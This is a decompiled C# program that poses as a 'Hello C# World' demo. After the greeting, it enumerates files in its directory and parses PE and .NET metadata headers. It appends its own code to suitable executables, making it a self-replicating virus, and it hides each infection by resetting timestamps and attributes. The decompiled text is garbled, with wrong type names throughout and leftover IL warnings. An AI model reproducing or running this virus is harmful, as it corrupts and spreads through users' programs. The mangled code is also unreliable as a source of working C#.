using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal class Hello
{
	private unsafe static void Main()
	{
		//IL_0736: Expected O, but got Ref
		//IL_0746: Expected O, but got I4
		//IL_07bd: Expected O, but got I4
		//IL_0c44: Expected O, but got I4
		//IL_0d2d: Expected O, but got I4
		//IL_0db6: Expected O, but got I4
		//IL_1062: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c7: Expected O, but got I4
		_ = Process.GetCurrentProcess().Id;
		Console.WriteLine("Hello C# World :-)");
		string[] files = File.GetFiles(Directory.ToString(Directory.ToChar(46)));
		string[] array = files;
		foreach (string text in array)
		{
			DateTime lastWriteTime;
			DateTime dateTime = (lastWriteTime = FileMode.GetLastWriteTime(text));
			if (((FileAttributes*)(&dateTime))->get_Second() == 0)
			{
				continue;
			}
			FileAttributes attributes = FileMode.GetAttributes(text);
			FileMode.SetAttributes(text, (FileAttributes)0);
			FileStream fileStream = FileMode.Open(text, FileMode.Open);
			byte[] array2;
			((BitConverter)(object)fileStream).Read(array2 = (byte[])(object)new Stream[252], 0, 64);
			if (SeekOrigin.ToInt16(array2, 0) == 23117)
			{
				int num;
				((BitConverter)(object)fileStream).Seek((long)(num = SeekOrigin.ToInt32(array2, 60)), SeekOrigin.Begin);
				((BitConverter)(object)fileStream).Read(array2, 0, 252);
				int num2;
				if (SeekOrigin.ToInt32(array2, 0) == 17744 && ((num2 = SeekOrigin.ToInt16(array2, 4) - 332) == 0 || num2 == 180) && (array2[23] & 0x70) == 0 && (SeekOrigin.ToInt16(array2, 22) & 0x102) == 258 && (SeekOrigin.ToInt16(array2, 92) & -2) == 2 && (array2[95] & 0x20) == 0 && SeekOrigin.ToInt32(array2, (num2 &= 0x10) + 152) == 0 && (num2 = SeekOrigin.ToInt32(array2, num2 + 232)) != 0)
				{
					((BitConverter)(object)fileStream).Seek((long)(SeekOrigin.ToInt16(array2, 20) - 228), SeekOrigin.Current);
					int num3;
					byte[] array3 = (byte[])(object)new Stream[num3 = SeekOrigin.ToInt16(array2, 6) * 40];
					((BitConverter)(object)fileStream).Read(array3, 0, num3);
					int num4 = (int)((BitConverter)(object)fileStream).Seek(-32L, SeekOrigin.Current);
					((BitConverter)(object)fileStream).Read(array2, 0, 32);
					if ((array2[31] & 0x80) == 0 && SeekOrigin.ToInt32(array2, 8) + SeekOrigin.ToInt32(array2, 12) == (int)((BitConverter)(object)fileStream).get_Length())
					{
						int num5 = num3;
						int num6;
						while ((num6 = SeekOrigin.ToInt32(array3, (num5 -= 40) + 12)) > num2)
						{
						}
						int num7 = (int)((BitConverter)(object)fileStream).Seek((long)(num2 - num6 + SeekOrigin.ToInt32(array3, num5 + 20) + 8), SeekOrigin.Begin);
						((BitConverter)(object)fileStream).Read(array2, 160, 48);
						if ((SeekOrigin.ToInt32(array2, 188) | SeekOrigin.ToInt32(array2, 204)) == 0)
						{
							long num8;
							num2 = (int)(num8 = SeekOrigin.ToInt64(array2, 160));
							num5 = num3;
							while ((num6 = SeekOrigin.ToInt32(array3, (num5 -= 40) + 12)) > num2)
							{
							}
							((BitConverter)(object)fileStream).Seek((long)(num2 - num6 + SeekOrigin.ToInt32(array3, num5 + 20)), SeekOrigin.Begin);
							int num9 = (int)(num8 >> 32);
							byte[] array4;
							((BitConverter)(object)fileStream).Read(array4 = (byte[])(object)new Stream[num9], 0, num9);
							if (SeekOrigin.ToInt64(array4, 0) == 281480383845186L)
							{
								short num12;
								short num11;
								int num10;
								int[] array5 = (int[])(object)new Array[((num12 = (num11 = SeekOrigin.ToInt16(array4, (num10 = SeekOrigin.ToInt32(array4, 12) + 20) - 2))) + 1) * 3];
								if (((uint)array4[num10 - 4] & (true ? 1u : 0u)) != 0)
								{
									num10 += SeekOrigin.ToInt32(array4, num10) + 4;
								}
								byte b = 0;
								int num13 = 0;
								int num14 = 0;
								int num15 = 0;
								int num16 = 0;
								do
								{
									array5[num13] = num10;
									array5[num13 + 1] = SeekOrigin.ToInt32(array4, num10);
									array5[num13 + 2] = SeekOrigin.ToInt32(array4, num10 + 4);
									if (((num6 = SeekOrigin.ToInt32(array4, num10 += 8)) & 0xFFFFFF) != 32291)
									{
										if ((num2 = SeekOrigin.ToInt32(array4, num10 + 4)) == 1936158313 && num6 == 1920226083 && array4[num10 + 8] == 0)
										{
											if (array5[num13 + 2] + 595 > 65535)
											{
												break;
											}
											num15 = num13 + 1;
										}
										else if (num6 == 1869365795 && (short)num2 == 98)
										{
											num16 = num13 + 1;
										}
									}
									else
									{
										if (((b = array4[array5[num13 + 1] + 6]) & 7u) != 0 || (SeekOrigin.ToInt32(array4, num2 = array5[num13 + 1] + 8) & 0x20442) != 132162 || (array4[num2 + 4] & 9) != 9)
										{
											break;
										}
										num14 = num13 + 1;
									}
									while (array4[num10++] != 0)
									{
									}
									num10 = (num10 + 3) & -4;
									num13 += 3;
								}
								while ((num12 = (short)(num12 - 1)) != 0);
								num10 += (b >> 4) & 4;
								if (num14 != 0 && num15 != 0 && num16 != 0)
								{
									int num17 = (array5[num13] = num10);
									byte[] array6;
									int num18;
									Marshal.Copy((Array)array4, 0, (Array)(array6 = (byte[])(object)new Stream[(num9 - array5[--num16 + 2] + 921) & -4]), 0, num18 = array5[0]);
									num14--;
									num15--;
									num13 = 0;
									do
									{
										if (num13 != num14 && num13 != num15 && num13 != num16)
										{
											num10 = array5[num13];
											int num19;
											Marshal.Copy((Array)array4, num10, (Array)array6, num18, num19 = array5[num13 + 3] - num10);
											Marshal.Copy((Array)array4, array5[num13 + 1], (Array)array6, num17, num10 = array5[num13 + 2]);
											Process.WriteInt32((object)array6, num18, num17);
											num18 += num19;
											num17 += num10;
										}
										num13 += 3;
									}
									while ((num11 = (short)(num11 - 1)) != 0);
									IntPtr baseAddress = ((IntPtr*)((ProcessModule)(object)ProcessModule.GetCurrentProcess()).get_MainModule())->get_BaseAddress();
									int num20;
									byte[] array7;
									Process.Copy(Process.ReadIntPtr((object)((num20 = ((Random)(&baseAddress)).ToInt32()) + 25121), 0), array7 = (byte[])(object)new Stream[6651], 0, 6651);
									Marshal.Copy((Array)array4, array5[num15], (Array)array6, num18, 20);
									Marshal.Copy((Array)array4, array5[num15 + 1], (Array)array6, num17, num10 = array5[num15 + 2]);
									int num21;
									Process.Copy(Process.ReadIntPtr((object)(num20 + 32092), 0), array6, num21 = num17 + num10, 595);
									int num22 = num10 - 156;
									Process.WriteInt32((object)array7, 1961, num10);
									Process.WriteInt64((object)array6, num18, ((long)(num10 = (num10 + 595) & -4) << 32) + num17);
									num18 += 20;
									num17 += num10;
									Marshal.Copy((Array)array4, array5[num14], (Array)array6, num18, 12);
									Process.WriteInt64((object)array6, num18, ((long)((array5[num14 + 2] + 329) & -4) << 32) + num17);
									num18 += 12;
									num8 = SeekOrigin.ToInt64(array4, (num10 = (num6 = array5[num14 + 1]) + 28) - 20);
									int num23 = SeekOrigin.ToInt32(array4, num10 - 4) * 10;
									num2 = num10;
									int num24 = 9774;
									int num25 = 0;
									num13 = 4;
									do
									{
										if (((byte)num8 & 4u) != 0)
										{
											num25 += SeekOrigin.ToInt32(array4, num10 += 4) * (num24 & 0xF);
										}
										num8 >>= 1;
										num24 >>= 4;
									}
									while (--num13 != 0);
									int num26;
									if ((num13 = (num26 = SeekOrigin.ToInt32(array4, num2)) + 19) < 32)
									{
										Process.WriteInt32((object)array4, num2, num13);
										int num27 = SeekOrigin.ToInt32(array4, num10 += 4);
										int num28 = 0;
										num24 = 1122;
										num13 = 3;
										do
										{
											if (((byte)num8 & 8u) != 0)
											{
												num28 += SeekOrigin.ToInt32(array4, num10 += 4) * (num24 & 0xF);
											}
											num8 >>= 1;
											num24 >>= 4;
										}
										while (--num13 != 0);
										num2 = (num10 += 4);
										int num29 = 0;
										num24 = 4613222;
										num13 = 6;
										do
										{
											if (((byte)num8 & 0x10u) != 0)
											{
												num29 += SeekOrigin.ToInt32(array4, num10 += 4) * (num24 & 0xF);
											}
											num8 >>= 1;
											num24 >>= 4;
										}
										while (--num13 != 0);
										int num30;
										Process.WriteInt32((object)array4, num2, (num30 = SeekOrigin.ToInt32(array4, num2)) + 35);
										num2 = (num10 += 4);
										int num31 = 0;
										num24 = 158176458;
										num13 = 10;
										do
										{
											if (((byte)num8 & 0x20u) != 0)
											{
												num31 += SeekOrigin.ToInt32(array4, num10 += 4) * (num24 & 7) * 2;
											}
											num8 >>= 1;
											num24 >>= 3;
										}
										while (--num13 != 0);
										num24 = 103490612;
										num13 = 7;
										do
										{
											if (((byte)num8 & 0x20u) != 0)
											{
												num31 += SeekOrigin.ToInt32(array4, num10 += 4) * (num24 & 0xF) * 2;
											}
											num8 >>= 1;
											num24 >>= 4;
										}
										while (--num13 != 0);
										num24 = SeekOrigin.ToInt32(array4, num10 += 4);
										num13 = 7;
										do
										{
											if (((byte)num8 & 0x40u) != 0)
											{
												num10 += 4;
											}
											num8 >>= 1;
										}
										while (--num13 != 0);
										if (num24 >= 2)
										{
											int num32;
											Process.WriteInt32((object)array4, num2, (num32 = SeekOrigin.ToInt32(array4, num2)) + 1);
											Marshal.Copy((Array)array4, num6, (Array)array6, num17, num13 = num10 - num6 + 4 + num23 + num26 * 6);
											num6 += num13;
											int num33;
											Process.Copy(Process.ReadIntPtr((object)(num20 + 32778), 0), array6, num33 = (num17 += num13), 114);
											num13 = 19;
											do
											{
												num2 = SeekOrigin.ToInt32(array6, num17 + 2);
												Process.WriteInt32((object)array6, num17 + 2, ((num2 + (num22 << 16)) & -65536) + ((num2 + num22) & 0xFFFF));
												num17 += 6;
											}
											while (--num13 != 0);
											Marshal.Copy((Array)array4, num6, (Array)array6, num17, num13 = num25 + num27 * 14 + num28 + num30 * 6);
											num6 += num13;
											int num34 = num17 + num25 - 20;
											int num35;
											Process.Copy(Process.ReadIntPtr((object)(num20 + 32978), 0), array6, num35 = (num17 += num13), 210);
											int num36 = num30 - 5 << 3;
											Process.WriteInt32((object)array7, 3310, num30);
											int num37;
											int num38 = (num37 = array5[num16 + 2]) - 52;
											Process.WriteInt32((object)array7, 3356, num37);
											int num39;
											byte[] array8;
											Process.Copy(Process.ReadIntPtr((object)(num39 = num20 + 33316), 0), array8 = (byte[])(object)new Stream[296], 0, 296);
											int num40 = num26 - 4 << 2;
											Process.WriteInt32((object)array7, 3440, num26);
											num13 = 35;
											do
											{
												Process.WriteInt16((object)array6, num17, (short)(SeekOrigin.ToInt16(array6, num17) + num36));
												num2 = SeekOrigin.ToInt32(array6, num17 + 2);
												Process.WriteInt32((object)array6, num17 + 2, ((num2 + (num38 << 16)) & -65536) + ((num2 + num22) & 0xFFFF));
												num24 = array8[num10 = (num2 >> 16) - 52] - 1;
												Process.WriteInt32((object)array7, 3590, num37);
												num10 += 2;
												do
												{
													byte b2;
													if ((b2 = array8[num10]) == 29 || (uint)(b2 - 15) <= 3u)
													{
														num10++;
														num24--;
														if ((uint)(b2 - 17) <= 1u)
														{
															byte[] array9;
															byte[] array10 = (array9 = array8);
															int num41 = num10;
															nint num42 = num41;
															array10[num41] = (byte)(array9[num42] + (byte)num40);
														}
													}
													num10++;
												}
												while (--num24 != 0);
												num17 += 6;
											}
											while (--num13 != 0);
											Marshal.Copy((Array)array4, num6, (Array)array6, num17, num13 = num29 + num32 * 2);
											num6 += num13;
											int num43;
											Process.WriteInt16((object)array6, num17 += num13, (short)(num43 = num37 + 296));
											if (SeekOrigin.ToInt64(array4, num13 = (num24 = array5[num15 + 1]) + SeekOrigin.ToInt16(array4, num6 + num31 + 14)) == 7091318327022416749L && array4[num13 + 8] == 0 && SeekOrigin.ToInt32(array4, num13 = num24 + SeekOrigin.ToInt16(array4, num6 + num31 + 34)) == 1953724755 && (SeekOrigin.ToInt32(array4, num13 + 4) & 0xFFFFFF) == 28005)
											{
												int num44;
												int num45;
												int num46;
												if (((uint)(num46 = array4[num45 = array5[num16 + 1] + SeekOrigin.ToInt16(array6, num13 = num17 - ((num44 = new _003F((int)System.Runtime.CompilerServices.Unsafe.As<DateTime, FileAttributes>(ref FileAttributes.get_Now()).get_Ticks()).Next(num32) + 1) << 1))]) & 0x80u) != 0)
												{
													num46 = ((num46 & 0x3F) << 8) + array4[++num45];
												}
												if ((num43 += (num2 = num46 + 83)) <= 65535)
												{
													Marshal.Copy((Array)array4, num6, (Array)array6, num17 + 2, num13 = array5[num14 + 1] + array5[num14 + 2] - num6);
													num17 = (num17 + num13 + 5) & -4;
													Marshal.Copy((Array)array4, array5[num16], (Array)array6, num18, 16);
													Process.WriteInt64((object)array6, num18, ((long)(num43 = (num43 + 5) & -4) << 32) + num17);
													num18 += 16;
													byte[] array11;
													Marshal.Copy((Array)array4, array5[num16 + 1], (Array)(array11 = (byte[])(object)new Stream[num43]), 0, num10 = array5[num16 + 2]);
													int num47;
													Marshal.Copy((Array)array8, 0, (Array)array11, num47 = num10, 296);
													num10 += 296;
													if (num2 > 255)
													{
														array11[num10++] = (byte)((uint)(num2 >> 8) | 0x80u);
													}
													array11[num10] = (byte)num2;
													array11[num10 + 1] = 7;
													if (((uint)(num16 = array4[num45 += 2]) & 0x80u) != 0)
													{
														num16 = ((num16 & 0x3F) << 8) + array4[++num45];
														num46--;
													}
													if ((num16 += 68) > 255)
													{
														array11[++num10 + 1] = (byte)((uint)(num16 >> 8) | 0x80u);
													}
													array11[num10 + 2] = (byte)num16;
													Marshal.Copy((Array)array4, num45 + 1, (Array)array11, num10 + 3, num46 - 2);
													Process.Copy(Process.ReadIntPtr((object)(num39 + 206), 0), array11, num10 += num46 + 1, 83);
													num15 = 68;
													do
													{
														byte b2;
														if ((b2 = array11[num10]) == 29 || (uint)(b2 - 15) <= 3u)
														{
															num10++;
															if ((uint)(b2 - 17) <= 1u)
															{
																byte[] array9;
																byte[] array12 = (array9 = array11);
																int num48 = num10;
																nint num42 = num48;
																array12[num48] = (byte)(array9[num42] + (byte)(num26 << 2));
															}
														}
														num10++;
													}
													while (--num15 != 0);
													do
													{
														num2 = SeekOrigin.ToInt32(array6, num34 += 20);
														while ((num6 = SeekOrigin.ToInt32(array3, (num3 -= 40) + 12)) > num2)
														{
														}
														((BitConverter)(object)fileStream).Seek((long)(num17 = num2 - num6 + SeekOrigin.ToInt32(array3, num3 + 20)), SeekOrigin.Begin);
														((BitConverter)(object)fileStream).Read(array2, 160, 12);
													}
													while ((array2[160] & 7) == 3 && (SeekOrigin.ToInt32(array2, 168) & 0xFFFFFF) != num44);
													if ((array2[160] & 8) == 0)
													{
														Process.WriteInt32((object)array6, num34, (num2 = SeekOrigin.ToInt32(array2, 4)) + (num6 = SeekOrigin.ToInt32(array2, 8)));
														((BitConverter)(object)fileStream).Seek(-12L, SeekOrigin.Current);
														num13 = SeekOrigin.ToInt32(array2, 164) - 1;
														((BitConverter)(object)fileStream).Read(array4 = (byte[])(object)new Stream[num13 + 12], 0, num13 + 12);
														Process.WriteInt16((object)array4, 2, (short)(SeekOrigin.ToInt16(array4, 2) + 8));
														Process.WriteInt64((object)array4, 4, ((long)(num32 + 285212673) << 32) + (num3 = num13 + 6651));
														Process.WriteInt32((object)array7, 1793, num17 = num2 + num6 + num13 + 12);
														Process.WriteInt32((object)array7, 1912, (num10 = (num17 + (num5 = num3 - (num45 = ((Marshal)(object)array4).GetLength(0)) + 12) + 3) & -4) + num21);
														Process.WriteInt32((object)array7, 3023, num10 + num33);
														Process.WriteInt32((object)array7, 3256, num10 + num35);
														Process.WriteInt32((object)array7, 3388, num10 + (num13 = (num46 = ((Marshal)(object)array6).GetLength(0))) + num47);
														int num49 = num32 - 1;
														Process.WriteInt32((object)array7, 5397, num32);
														num36 >>= 3;
														num16 = 0;
														do
														{
															byte b2;
															if ((b2 = array7[num16++]) != 31)
															{
																switch (b2)
																{
																case 43:
																case 44:
																case 45:
																case 46:
																case 47:
																case 48:
																case 49:
																case 50:
																case 51:
																case 52:
																case 53:
																case 54:
																case 55:
																case 222:
																	break;
																default:
																	continue;
																case 69:
																	num16 += (SeekOrigin.ToInt32(array7, num16) + 1) * 4;
																	continue;
																case 254:
																	if ((b2 = array7[num16++]) == 18)
																	{
																		num16++;
																		continue;
																	}
																	switch (b2)
																	{
																	case 9:
																	case 10:
																	case 11:
																	case 12:
																	case 13:
																	case 14:
																		Process.WriteInt16((object)array7, num16, (short)(SeekOrigin.ToInt16(array7, num16) + num49));
																		num16 += 2;
																		break;
																	case 6:
																	case 7:
																	case 21:
																	case 28:
																		Process.WriteInt32((object)array7, num16, SeekOrigin.ToInt32(array7, num16) + num36);
																		num16 += 4;
																		break;
																	}
																	continue;
																case 39:
																case 40:
																case 41:
																case 111:
																case 112:
																case 113:
																case 114:
																case 115:
																case 116:
																case 117:
																case 121:
																case 123:
																case 124:
																case 125:
																case 126:
																case 127:
																case 128:
																case 129:
																case 140:
																case 141:
																case 143:
																case 194:
																case 198:
																case 208:
																	Process.WriteInt32((object)array7, num16, SeekOrigin.ToInt32(array7, num16) + num36);
																	num16 += 4;
																	continue;
																case 33:
																case 35:
																	num16 += 8;
																	continue;
																case 32:
																case 34:
																case 56:
																case 57:
																case 58:
																case 59:
																case 60:
																case 61:
																case 62:
																case 63:
																case 64:
																case 65:
																case 66:
																case 67:
																case 68:
																case 221:
																	num16 += 4;
																	continue;
																}
															}
															num16++;
														}
														while (num16 != 6651);
														Process.WriteInt64((object)array2, 160, ((long)(num13 += (num16 = ((Marshal)(object)array11).GetLength(0))) << 32) + (num2 + num6 + (num43 = (num3 + 15) & -4)));
														((BitConverter)(object)fileStream).Seek((long)num7, SeekOrigin.Begin);
														((BitConverter)(object)fileStream).Write(array2, 160, 8);
														Process.WriteInt32((object)array2, 0, num43 += num6 + num13);
														num13 = SeekOrigin.ToInt32(array2, 60) - 1;
														Process.WriteInt32((object)array2, 8, num43 = (num43 + num13) & ~num13);
														((BitConverter)(object)fileStream).Seek((long)num4, SeekOrigin.Begin);
														((BitConverter)(object)fileStream).Write(array2, 0, 12);
														num13 = SeekOrigin.ToInt32(array2, 56) - 1;
														Process.WriteInt32((object)array2, 80, (num43 + num2 + num13) & ~num13);
														num6 = SeekOrigin.ToInt32(array2, 88);
														Process.WriteInt32((object)array2, 88, 0);
														((BitConverter)(object)fileStream).Seek((long)(num + 80), SeekOrigin.Begin);
														((BitConverter)(object)fileStream).Write(array2, 80, 12);
														((BitConverter)(object)fileStream).Seek(0L, SeekOrigin.End);
														((BitConverter)(object)fileStream).Write(array4, 0, num45);
														((BitConverter)(object)fileStream).Write(array7, 0, num5);
														((BitConverter)(object)fileStream).Seek((long)(((int)((BitConverter)(object)fileStream).Seek(0L, SeekOrigin.Current) + 3) & -4), SeekOrigin.Begin);
														((BitConverter)(object)fileStream).Write(array6, 0, num46);
														((BitConverter)(object)fileStream).Write(array11, 0, num16);
														((BitConverter)(object)fileStream).SetLength((long)(num43 += SeekOrigin.ToInt32(array2, 12)));
														if (num6 != 0)
														{
															((BitConverter)(object)fileStream).Seek(0L, SeekOrigin.Begin);
															num6 = 0;
															num13 = num43;
															do
															{
																((BitConverter)(object)fileStream).Read(array2, 0, 2);
																num6 = (short)num6 + SeekOrigin.ToInt16(array2, 0) + (num6 >> 16);
															}
															while ((num13 -= 2) != 0);
															Process.WriteInt32((object)array2, 0, num43 + (short)num6 + (num6 >> 16));
															((BitConverter)(object)fileStream).Seek((long)(num + 88), SeekOrigin.Begin);
															((BitConverter)(object)fileStream).Write(array2, 0, 4);
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			((BitConverter)(object)fileStream).Close();
			FileMode.SetLastWriteTime(text, ((FileAttributes*)(&lastWriteTime))->AddSeconds((double)(-((FileAttributes*)(&lastWriteTime))->get_Second())));
			FileMode.SetAttributes(text, attributes);
		}
	}
}
